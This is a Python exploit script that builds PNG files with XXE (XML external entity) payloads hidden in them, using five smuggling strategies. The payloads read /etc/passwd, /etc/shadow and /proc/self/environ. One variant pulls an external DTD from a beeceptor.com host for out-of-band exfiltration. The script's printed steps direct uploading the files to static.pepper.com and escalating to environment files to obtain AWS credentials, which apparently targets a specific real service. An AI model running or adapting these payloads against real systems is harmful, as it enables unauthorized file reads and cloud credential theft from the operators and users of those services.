#!/usr/bin/env python3
"""
Creates a polyglot file that:
- Starts with valid PNG magic bytes + IHDR (passes magic byte validation)
- Contains SVG with XXE payload in a valid PNG tEXt chunk
- Also creates a variant where the PNG is subtly malformed after the header
  so the processor might fall back to content sniffing
"""
import struct
import zlib
import sys
import os

def png_chunk(chunk_type, data):
    """Create a valid PNG chunk"""
    chunk = chunk_type + data
    crc = struct.pack('>I', zlib.crc32(chunk) & 0xffffffff)
    length = struct.pack('>I', len(data))
    return length + chunk + crc

def read_original_png(path):
    """Read and parse chunks from original PNG"""
    with open(path, 'rb') as f:
        sig = f.read(8)
        chunks = []
        while True:
            raw_len = f.read(4)
            if len(raw_len) < 4:
                break
            length = struct.unpack('>I', raw_len)[0]
            chunk_type = f.read(4)
            data = f.read(length)
            crc = f.read(4)
            chunks.append((chunk_type, data))
        return sig, chunks

PNG_SIGNATURE = b'\x89PNG\r\n\x1a\n'

# XXE payloads targeting different files
xxe_payloads = {
    "hostname": '/etc/hostname',
    "passwd": '/etc/passwd', 
    "environ": '/proc/self/environ',
    "shadow": '/etc/shadow',
}

def make_svg_xxe(target_file):
    return f'''<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="402" height="442">
  <rect width="100%" height="100%" fill="white"/>
  <text x="10" y="40" font-size="12">&xxe;</text>
</svg>'''.encode()

def strategy_1_text_chunk(original_path, target_file, output_path):
    """
    Valid PNG with SVG/XXE injected into a tEXt chunk.
    If the processor extracts and processes text chunks as XML, XXE fires.
    """
    sig, chunks = read_original_png(original_path)
    svg_payload = make_svg_xxe(target_file)
    
    out = PNG_SIGNATURE
    for chunk_type, data in chunks:
        out += png_chunk(chunk_type, data)
        # Insert tEXt chunk right after IHDR
        if chunk_type == b'IHDR':
            text_data = b'Raw Profile Type svg\x00' + svg_payload
            out += png_chunk(b'tEXt', text_data)
            # Also try iTXt which supports UTF-8
            itxt_data = b'XML:com.adobe.xmp\x00\x00\x00\x00\x00' + svg_payload
            out += png_chunk(b'iTXt', itxt_data)
    
    with open(output_path, 'wb') as f:
        f.write(out)
    print(f"[+] Strategy 1 (tEXt chunk): {output_path}")

def strategy_2_malformed_fallback(original_path, target_file, output_path):
    """
    PNG magic bytes + valid IHDR, then corrupted IDAT so PNG parsing fails.
    SVG content follows. If processor falls back to content sniffing after
    PNG decode failure, it might try SVG.
    """
    sig, chunks = read_original_png(original_path)
    svg_payload = make_svg_xxe(target_file)
    
    out = PNG_SIGNATURE
    for chunk_type, data in chunks:
        if chunk_type == b'IHDR':
            out += png_chunk(chunk_type, data)
        elif chunk_type == b'IDAT':
            # Write corrupted IDAT - just enough to fail PNG decode
            out += png_chunk(b'IDAT', b'\x00' * 10)
            break
    
    # Pad with nulls then SVG
    out += b'\x00' * 16
    out += svg_payload
    out += b'\x00' * 16
    
    # End with valid IEND
    out += png_chunk(b'IEND', b'')
    
    with open(output_path, 'wb') as f:
        f.write(out)
    print(f"[+] Strategy 2 (malformed fallback): {output_path}")

def strategy_3_after_iend(original_path, target_file, output_path):
    """
    Complete valid PNG followed by SVG payload after IEND.
    Some parsers read past IEND. If a secondary parser processes
    the trailing data as SVG, XXE fires.
    """
    with open(original_path, 'rb') as f:
        original = f.read()
    
    svg_payload = make_svg_xxe(target_file)
    
    out = original + b'\n' + svg_payload
    
    with open(output_path, 'wb') as f:
        f.write(out)
    print(f"[+] Strategy 3 (after IEND): {output_path}")

def strategy_4_icc_profile(original_path, target_file, output_path):
    """
    Inject SVG/XXE payload as an ICC profile chunk (iCCP).
    Some processors parse ICC profiles which can trigger XML processing.
    """
    sig, chunks = read_original_png(original_path)
    svg_payload = make_svg_xxe(target_file)
    
    # Compress the payload as iCCP requires deflate compression
    compressed = zlib.compress(svg_payload)
    
    out = PNG_SIGNATURE
    for chunk_type, data in chunks:
        out += png_chunk(chunk_type, data)
        if chunk_type == b'IHDR':
            # iCCP: profile name + null + compression method (0) + compressed data
            iccp_data = b'svg_profile\x00\x00' + compressed
            out += png_chunk(b'iCCP', iccp_data)
    
    with open(output_path, 'wb') as f:
        f.write(out)
    print(f"[+] Strategy 4 (iCCP profile): {output_path}")

def strategy_5_exif_xxe(original_path, target_file, output_path):
    """
    PNG with SVG/XXE embedded in an eXIf chunk.
    Some EXIF parsers process embedded XMP as XML.
    """
    sig, chunks = read_original_png(original_path)
    
    # XMP packet with XXE
    xmp_xxe = f'''<?xpacket begin="\xef\xbb\xbf"?>
<!DOCTYPE x [
  <!ENTITY % file SYSTEM "file://{target_file}">
  <!ENTITY % dtd SYSTEM "https://viv4ldi.free.beeceptor.com/evil.dtd">
  %dtd;
]>
<x:xmpmeta xmlns:x="adobe:ns:meta/">
  <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
    <rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">
      <dc:description>test</dc:description>
    </rdf:Description>
  </rdf:RDF>
</x:xmpmeta>
<?xpacket end="w"?>'''.encode() 
    
    out = PNG_SIGNATURE
    for chunk_type, data in chunks:
        out += png_chunk(chunk_type, data)
        if chunk_type == b'IHDR':
            # Add as iTXt with XMP namespace
            itxt_data = b'XML:com.adobe.xmp\x00\x00\x00\x00\x00' + xmp_xxe
            out += png_chunk(b'iTXt', itxt_data)
    
    with open(output_path, 'wb') as f:
        f.write(out)
    print(f"[+] Strategy 5 (XMP/EXIF XXE): {output_path}")

if __name__ == '__main__':
    original = sys.argv[1] if len(sys.argv) > 1 else 'vivaldi.png'
    
    if not os.path.exists(original):
        print(f"[-] {original} not found")
        sys.exit(1)
    
    os.makedirs('payloads', exist_ok=True)
    
    target = '/etc/hostname'  # Start simple
    
    # strategy_1_text_chunk(original, target, 'payloads/s1_text_chunk.png')
    # strategy_2_malformed_fallback(original, target, 'payloads/s2_malformed.png')
    # strategy_3_after_iend(original, target, 'payloads/s3_after_iend.png')
    # strategy_4_icc_profile(original, target, 'payloads/s4_iccp.png')
    strategy_5_exif_xxe(original, target, 'payloads/s5_xmp_xxe.png')
    
    print(f"\n[*] Generated 5 payload files in ./payloads/")
    print(f"[*] All target: {target}")
    print(f"[*] Upload each one, download result from static.pepper.com")
    print(f"[*] Check output with: exiftool <output> and visually inspect")
    print(f"[*] If hostname leaks, regenerate with /proc/self/environ for AWS creds")
